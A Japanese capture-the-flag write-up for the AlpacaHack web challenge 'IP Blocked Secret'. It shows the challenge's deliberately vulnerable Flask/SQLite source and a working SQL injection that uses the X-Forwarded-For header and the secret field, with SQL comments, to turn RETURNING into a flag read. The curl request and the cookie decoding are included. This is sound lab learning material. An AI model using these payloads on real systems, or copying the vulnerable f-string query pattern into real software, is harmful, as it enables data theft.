---
title: Daily-AlpacaHack 「IP Blocked Secret」Hard Writeup
description: SQL Injection
date: 2026-07-06 14:21:00 +0900
categories: [CyberSecurity, CTF]
tags: [alpacahack, web, sql_injection]
---

# 20260705-daily_alpaca-web-hard-ip_blocked_secret

## Summary

本問は，SQL Injection に関する問題です．

> - **Category**: Web
> - **Description**: これまで以上に安全です！
> - **Tools & TechStack**:
> 	- Python
> 	- SQLite
> - **Release**: 2026/07/05
{: .prompt-info }

**階層構造**
```
.
├── compose.yaml
└── web
    ├── app.py
    ├── Dockerfile
    ├── entrypoint.sh
    ├── init_db.py
    └── requirements.txt

2 directories, 6 files
```

---
## ソースコードの調査

このアプリケーションは，ユーザーのIPアドレスをキーとして秘密情報 (`secret`) を管理し，セッションID（`sid`）を介してそのデータへのアクセス権を制御する仕組みになっていました．  
実装されているエンドポイントは以下の2つです．

- `/`: ユーザーが秘密情報を閲覧するためのエンドポイント
	1. リクエスト元のIPアドレス (`X-Forwarded-For` を優先) を取得します．
	2. セッション内の `sid` を確認し，データベース (`secrets` テーブル) から該当するレコードを検索します．
	3. **アクセス制御**: データベース上の `ip` と，現在のリクエストの `ip` を照合します．
	    - 一致しない場合は `403 Unauthorized` を返します (IPブロック)．
	4. 一致する場合，保存されている `secret` を表示します．データがない場合は `No secret yet` と表示します．

- `/set`: ユーザーが秘密情報を登録または更新するためのエンドポイント
    1. IPアドレスを取得し，形式を検証します．
    2. ユーザーから送信された `secret` を取得し，SQLインジェクション対策としてシングルクォートをエスケープ (`'` を `''` に置換) します．
    3. **データベース操作**: `INSERT ... ON CONFLICT(ip) DO UPDATE` を使用しているため，そのIPアドレスのデータが既に存在する場合は `secret` を更新し，存在しない場合は新規登録します．
    4. 返された `id` をセッションの `sid` に保存します．
    5. `/` にリダイレクトし，更新結果を表示させます．

`web/app.py`
```python
import os
from flask import Flask, g, redirect, request, url_for, session, render_template_string
import re
import sqlite3

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY")

if not app.secret_key:
    print("SECRET_KEY is not set")
    exit()


IPV4_RE = re.compile(r"\d{,3}.\d{,3}.\d{,3}.\d{,3}", re.ASCII)

@app.before_request
def set_db():
    g.db = sqlite3.connect("/tmp/app.db")
    g.db.row_factory = sqlite3.Row


@app.teardown_appcontext
def close_db(_):
    db = g.pop("db", None)
    if db is not None:
        db.close()

INDEX = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <title>IP Blocked Secret</title>
</head>
<body>
    Your current secret: {{ secret }}
    <h2>Update secret</h2>
    <form action="/set" method="POST">
        <input name="secret" placeholder="My password is Passw0rd">
        <input type="submit">
    </form>
</body>
</html>
""".strip()

@app.get("/")
def index():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    sid = session.get("sid", None)
    if not IPV4_RE.fullmatch(ip):
        return "Invalid IP", 400
        
    print(f"get> ip: {ip}" ,flush=True) # Debug
    print(f"get> sid: {sid}" ,flush=True) # Debug

    data = g.db.execute(f"""
        SELECT secret, ip FROM secrets WHERE id='{sid}'
    """).fetchone()
    if not data:
        return render_template_string(INDEX, secret="No secret yet")
    
    if ip != data["ip"]:
        return "Unauthorized", 403
    
    return render_template_string(INDEX, secret=data["secret"])


@app.post("/set")
def set():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    secret = request.form.get("secret", "")
    if not IPV4_RE.fullmatch(ip):
        return "Invalid IP", 400
    
    print(f"set> ip: {ip}" ,flush=True) # Debug
    print(f"set> secret: {secret}" ,flush=True) # Debug

    secret = secret.replace("'", "''")
    print(f"set> rep_secret: {secret}" ,flush=True) # Debug

    cur = g.db.execute(f"""
        INSERT INTO secrets (ip, secret)
        VALUES ('{ip}', '{secret}')
        ON CONFLICT(ip) DO UPDATE SET
            secret = excluded.secret
        RETURNING id
    """)
    session["sid"] = cur.fetchone()["id"]
    g.db.commit()
    return redirect(url_for("index"))
```

`web/init_db.py`
```python
import sqlite3
import os, re

FLAG = os.environ.get("FLAG", "")
if not re.match(r"Alpaca\{[a-zA-Z0-9_]+\}", FLAG):
    print("invalid flag")
    exit()

db = sqlite3.connect("/tmp/app.db")
db.execute("""
    CREATE TABLE IF NOT EXISTS secrets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        ip TEXT NOT NULL UNIQUE,
        secret TEXT NOT NULL
    )
""")
db.execute("""
    CREATE TABLE IF NOT EXISTS flag (
        flag TEXT NOT NULL
    )
""")
db.execute(f"""
    INSERT INTO flag (flag) VALUES ('{FLAG}')
""")
db.commit()
```

## `/set` エンドポイントに対する **SQL Injection** と実装ミス

- **SQL Injection**: 
	- `/set` エンドポイントの `INSERT` に，プレースホルダが使用されていないため，**SQL Injection** に対して脆弱です．
	- また，`/` エンドポイントも同様に脆弱ですが，`sid` を改竄するためにはFlaskのシークレットキーが必要なので関係なさそう？
- **IPV4正規表現のミス**: 
	  - `{,3}` によって，空文字 (**0回の繰り返し**) も受け入れる．
	  - `.` が エスケープ`\.` になっていないため，任意の1文字を表すワイルドカードとして動作する．
- `secret.replace("'", "''")` によって，シングルクオーテーションを用いるSQLはインジェクトできない．

`RETURNING` の中身を `SELECT flag FROM flag` にすることができれば，返ってきた **Flag** を Pythonが `session["sid"] = cur.fetchone()["id"]` で `sid` にして返してくれます．  
そこで，`{secret}` 以下を丸ごと乗っ取る方法を考えました．

## 解法

`ip` に，`'/*` を入れて，プログラム側が用意した区切り `, '` をコメントアウトします．  
次に，`secret` において，`ip` のコメントを先頭で閉じ，元の文から `RETURNING` 内のみを `SELECT flag FROM flag` に変えたものを入れ，残りの文を複数行コメント (`/*`) で無視させます．

**`secret` に対するSQLペイロード**
```sql
secret=*/, 123) ON CONFLICT(ip) DO UPDATE SET secret=excluded.secret RETURNING (SELECT flag FROM flag) AS id /*
```

**`X-Forwarded-For` に対するSQLペイロード**
```sql
1'/*
```

### 実行

```shell
$ curl -v http://localhost:3000/set \
-H "Content-Type: application/x-www-form-urlencoded" \
-H "X-Forwarded-For: 1'/*" \
--data-urlencode "secret=*/, 123) ON CONFLICT(ip) DO UPDATE SET secret=excluded.secret RETURNING (SELECT flag FROM flag) AS id /*"
#...
< Location: /
< Vary: Cookie
< Set-Cookie: session=eyJzaWQiOiJBbHBhY2F7UkVEQUNURUR9In0.akny1A.K-jSY7lBQaY-EMZYAUgL3bfQUnw; HttpOnly; Path=/
#...
```

このSQL文が送信されると，SQLiteのパーサーは．複数行コメント `/* ... */` の部分を無視して実行します．

```sql
-- 実際にプログラムが構築した文字列 (/* から */ までがコメントとして扱われる)
INSERT INTO secrets (ip, secret)
        VALUES ('1' /* ', ' */ , 123) ON CONFLICT(ip) DO UPDATE SET secret=excluded.secret RETURNING (SELECT flag FROM flag) AS id /* ')
        ON CONFLICT(ip) DO UPDATE SET
            secret = excluded.secret
        RETURNING id
```

後は，返ってきた `sid` をデコードすれば **Flag** が入手できました．

```shell
$ flask-unsign --decode --cookie 'eyJzaWQiOiJBbHBhY2F7UkVEQUNURUR9In0.akny1A.K-jSY7lBQaY-EMZYAUgL3bfQUnw'
{'sid': 'Alpaca{REDACTED}'}
```

---
## Post-Mortem & Dead ends

## References
